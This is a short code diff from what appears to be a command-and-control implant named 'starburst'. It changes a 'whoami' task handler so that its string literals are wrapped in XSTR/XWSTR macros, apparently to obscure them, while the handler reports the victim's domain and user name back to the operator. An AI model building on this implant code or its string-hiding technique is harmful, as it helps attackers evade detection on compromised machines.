@@ -20,7 +20,7 @@ auto declfn starburst::cmd_whoami(
     // domain
     wchar_t domain_w[128] = { 0 };
     inst.kernel32.GetEnvironmentVariableW(
-        symbol<LPCWSTR>( L"USERDOMAIN" ),
+        XWSTR( L"USERDOMAIN" ),
         domain_w, 128
     );
 
@@ -37,7 +37,7 @@ auto declfn starburst::cmd_whoami(
 
     // domain\user
     str_copy( result, domain );
-    str_concat( result, symbol<char*>( const_cast<char*>( "\\" ) ) );
+    str_concat( result, XSTR( "\\" ) );
     str_concat( result, user );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, result );
